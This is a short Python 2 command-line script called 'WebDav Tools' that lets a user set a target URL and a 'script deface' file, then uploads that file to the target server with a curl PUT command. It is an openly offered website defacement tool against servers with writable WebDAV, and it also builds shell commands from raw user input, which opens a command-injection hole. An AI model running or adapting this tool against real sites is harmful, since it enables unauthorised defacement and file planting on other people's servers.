#!/usr/bin/python

import os
import sys
os.system("clear")

def banner():
 print ("""
\t  ______ _______ ______ _______  ______
\t |_____/ |_____|  ____/ |______ |_____/
\t |    \_ |     | /_____ |______ |    \_
""")

def main():

    while True:
        px = raw_input("WebDav@Tools:~#").lower()
        
        if px == 'banner':
            os.system("clear")
            banner()
            main()
            
        elif px == "clear":
            os.system("clear")
            
        elif px == "exit":
            exit()
            
        elif "help" in px:
            os.system("clear")
            banner()
            print("""
\t Commands:
\t      set url    : setting your target
\t      set file   : setting your script deface
\t      show       : show url and filename
\t      start      : start webdav  
\t      clear      : clean the screen
\t      exit       : exiting tools
            """)             
            
        elif "set url" in px:
            url = px.split()[-1]
            
        elif "set file" in px:
            file_name = px.split()[-1]
            
        elif px == "show":
            print "\n[*] Target  : %s\n[*] Filename  : %s\n" % (url,file_name)
         
        elif px == "start":
            print("[!] Starting WebDav")
            os.system("sleep 2")
            print("[!] Target  : %s\n[!] Filename   : %s" % (url,file_name))
            os.system("sleep 2")
            os.system("curl -T %s %s" % (file_name,url)) 
            
        else:
            print("[!] What Your Entered Is Wrong")    
            main()                

def control():
    try:
        banner()
        main()
    except KeyboardInterrupt:
        print("\n[+] Detect . . .")
        os.system("sleep 1")
if __name__ == "__main__": 
    control()                                 
